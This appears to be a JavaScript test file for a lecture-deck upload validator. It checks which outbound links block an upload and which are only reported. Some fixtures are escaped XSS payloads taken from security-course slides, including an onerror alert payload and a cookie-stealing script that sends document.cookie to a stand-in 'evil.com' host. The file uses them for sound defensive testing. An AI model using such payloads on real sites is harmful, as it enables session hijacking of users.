// What an uploaded deck is allowed to point at, and what merely gets mentioned.
//
// The rule these cases pin down: a deck is refused only when it is broken or
// when it lets a student slip back out to the ungated public copy of the
// lecture. Where else it links is reported, never refused.
//
// This exists because the opposite shipped. `undeclared_host` — any host not
// typed into the "sites this deck links to" box beforehand — used to block the
// upload outright, and a lecture that pointed students at a password-strength
// checker could not be imported at all. The professor was asked to declare a
// host they had no reason to know they had to declare, to permit a link that
// was the entire point of the slide.
//
// Blocking it also bought nothing. /content serves decks under
// `default-src 'none'; img-src data: blob:` (public/_headers), so an external
// subresource cannot load into the page whatever this validator decides, while
// a plain link is navigation and was never a subresource. The runtime already
// contains the risk; the validator was only refusing the professor.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import ts from "typescript";
import { backendPath, skipWithoutBackend } from "./lib/backend-root.mjs";

const REL = "supabase/functions/_shared/deck-validation.ts";
if (skipWithoutBackend("verify-deck-outbound-links", REL)) process.exit(0);

const compiled = ts.transpileModule(readFileSync(backendPath(REL), "utf8"), {
  compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 }
}).outputText;
const validation = await import(
  `data:text/javascript;base64,${Buffer.from(compiled).toString("base64")}`
);

const deck = (body) =>
  `<!DOCTYPE html><html><head><title>Password strength</title></head><body>${body}</body></html>`;

function check(html, allowedHosts = []) {
  const problems = validation.validateDeckHtml(html, {
    allowedHosts,
    forbiddenHosts: ["mzareei.github.io"]
  });
  const { blocking, notices } = validation.partitionDeckProblems(problems);
  return {
    blocked: blocking.length > 0,
    kinds: blocking.map((problem) => problem.kind),
    notices: notices.map((problem) => problem.host || problem.reference),
    // What the validator found, before anything decided whether to refuse it.
    // Most findings no longer block, so `kinds` alone can no longer tell a
    // scan that missed a reference from one that found it and let it through.
    found: problems.map((problem) => problem.kind)
  };
}

// ------------------------------------------------------- must not be refused
// The reported case, verbatim in shape: a link to a password-strength checker
// the professor never declared, so students can scan it from the slide.
const passwordChecker = check(
  deck('<a href="https://www.security.org/how-secure-is-my-password/">Test yours</a>')
);
assert.equal(
  passwordChecker.blocked, false,
  "an ordinary outbound teaching link must not refuse the upload — this is the exact failure this file exists for"
);
assert.deepEqual(
  passwordChecker.notices, ["www.security.org"],
  "...but the professor must still be told where the deck points"
);

// A QR code students scan: the image is inline (the only kind that can render
// under the /content CSP) and the destination is a link.
assert.equal(
  check(deck(
    '<img src="data:image/png;base64,iVBORw0KGgo="><a href="https://security.org">go</a>'
  )).blocked,
  false,
  "an inline QR image beside an outbound link must upload"
);

// Declaring the host is now only a way to silence the mention.
assert.deepEqual(
  check(deck('<a href="https://www.security.org/x">t</a>'), ["www.security.org"]).notices,
  [],
  "a declared host must produce no notice — that is all the box is still for"
);

// An external subresource cannot render under the CSP, but that is the
// runtime's business; the upload still succeeds and says where it points.
const externalFont = check(
  deck('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">')
);
assert.equal(externalFont.blocked, false, "an external stylesheet must not refuse the upload");
assert.deepEqual(externalFont.notices, ["fonts.googleapis.com"], "...it must be mentioned");

// ----------------------------------------------------------- must be refused
// Pitfall #57, the incident the validator was written for: a deck linking to
// the public copy of its own lecture puts the student one click outside the
// gate. Nothing about relaxing undeclared hosts may weaken this.
const publicCopy = check(deck('<a href="https://mzareei.github.io/lectures/week1.html">copy</a>'));
assert.equal(publicCopy.blocked, true, "a link to the ungated public site must still refuse the upload");
assert.deepEqual(publicCopy.kinds, ["forbidden_host"]);

// ...and that is the only one. Everything else the validator finds is now
// reported after the deck uploads, because everything else describes how the
// deck will LOOK — which the professor can see and judge — rather than what a
// student can reach.

// A relative reference 404s behind the gate, so that image comes out blank.
// A flaw in one slide is not worth refusing a finished lecture over, and this
// is the finding that cannot be told apart with certainty from text that
// merely resembles a reference (see the section below).
const relative = check(deck('<img src="images/diagram.png">'));
assert.equal(relative.blocked, false, "a blank image must not refuse the upload");
assert.deepEqual(relative.found, ["relative"], "...but it must still be found and reported");
assert.deepEqual(relative.notices, ["images/diagram.png"], "...naming what will be blank");

// The library still needs a name for the item, but the import derives one —
// from the question bank, the <title>, the file name, or the slug — and the
// endpoint rejects an empty title on its own. A missing <title> used to send
// the professor back to edit the HTML over a name the platform could work out.
const untitled = check("<html><body><p>nothing</p></body></html>");
assert.equal(untitled.blocked, false, "a missing <title> must not refuse the upload");
assert.deepEqual(untitled.found, ["no_title"], "...but the professor is told it was named for them");

// ------------------------------------------------------------ not a reference
// Self-contained decks carry inline JS, and ordinary variable names must not
// be misread as outbound references.
assert.equal(
  check(deck('<script>let src = "https://evil.example"; console.log(src);</script>')).blocked,
  false,
  "an inline script body must not be scanned for references"
);
assert.deepEqual(
  check(deck('<script>let src = "https://evil.example";</script>')).notices,
  [],
  "...and must not produce a notice either"
);

// ------------------------------------------- what only LOOKS like a reference
// A deck is a document, and most of what looks like `src=` in it is not a
// reference at all: it is a slide teaching what `src=` is. This validator used
// to regex the raw file end to end, with no notion of where a tag starts, so
// prose, code samples and attribute names all counted. On a security course
// the false positives are guaranteed — the canonical XSS payload IS an <img
// src=> — and every one of them refused the upload with an error naming a
// "file" the professor never wrote.

// These assert on `found`, not on `blocked`. Only a link to the public site
// refuses an upload now, so `blocked` would be false here even if the scan
// were still misreading every one of them — and the professor would still be
// handed a list of files they never wrote. The scan must find nothing at all.

// The reported case: an escaped payload shown on a slide. Reference: "x".
assert.deepEqual(
  check(deck("<pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>")).found,
  [],
  "an escaped code sample is text on a slide, not a reference the browser will fetch"
);

// The reported case, second error: a code sample with the value syntax-
// highlighted, so `href=` is followed by markup. Reference: "<span".
assert.deepEqual(
  check(deck('<code>&lt;a href=<span class="hl">javascript:alert(1)</span>&gt;</code>')).found,
  [],
  "a highlighted code sample must not have its markup misread as the attribute's value"
);

// From week-10 of the live course: a rule table tagging its rows with the
// verdict. Reference: "allow".
assert.deepEqual(
  check(deck('<tr data-action="allow"><td>:443</td></tr>')).found,
  [],
  "data-* is not the attribute it ends with — data-action is data, not an action URL"
);

// From week-03 of the live course: the cookie-stealing XSS example, escaped.
assert.deepEqual(
  check(deck("<p>Attacker posts &lt;script&gt;location['href']='evil.com?c='+document.cookie&lt;/script&gt;</p>")).found,
  [],
  "escaped script text on a slide is not a reference"
);

// CSS quoted on a slide is the same story as HTML quoted on a slide.
assert.deepEqual(
  check(deck("<pre>.slide { background: url(images/bg.png); }</pre>")).found,
  [],
  "CSS shown as text must not be scanned as if it were CSS the page applies"
);

// A <title> carrying an attribute is still a title. The client reads it with
// /<title[^>]*>/ and names the item from it, so refusing it here rejected a
// deck the professor could see was titled.
assert.deepEqual(
  check('<html><head><title lang="en">Firewalls</title></head><body><p>x</p></body></html>').found,
  [],
  "a <title> with an attribute must count as a title"
);

// ------------------------------- ...and what still IS one, after all of that
// The bilingual decks put real markup inside data-es and swap it into the DOM,
// so a link in there renders and can be clicked. Narrowing the scan must not
// lose it — this is pitfall #57 hiding one level down.
const inAttribute = check(deck(
  '<li data-es="Vuelve a la <a href=\'https://mzareei.github.io/week-10/\'>clase</a>">Back</li>'
));
assert.equal(
  inAttribute.blocked, true,
  "markup inside a bilingual attribute is swapped into the page — its links are real links"
);
assert.deepEqual(inAttribute.kinds, ["forbidden_host"]);

// SVG's own href spelling. It used to match by accident, because `href` was
// matched with no left boundary at all; now it is named on purpose.
assert.deepEqual(
  check(deck('<svg><image xlink:href="diagram.png"></image></svg>')).found,
  ["relative"],
  "xlink:href is a real reference in SVG"
);

// -------------------------------------------------------- the caller agrees
// The validator can only advise; the import function decides. If it ever goes
// back to refusing on the raw problem list, every case above becomes decorative.
const importFn = readFileSync(
  backendPath("supabase/functions/course-content-import/index.ts"), "utf8"
);
assert.match(
  importFn, /partitionDeckProblems\(problems\)/,
  "the import function must split blocking findings from notices"
);
assert.match(
  importFn, /if \(blocking\.length\)/,
  "the import function must refuse only on blocking findings, not on every problem"
);
assert.doesNotMatch(
  importFn, /if \(problems\.length\) \{\s*result\.deck = \{ ok: false, problems \};/,
  "the import function must not refuse on the unpartitioned problem list"
);

console.log("verify-deck-outbound-links: OK (17 cases)");
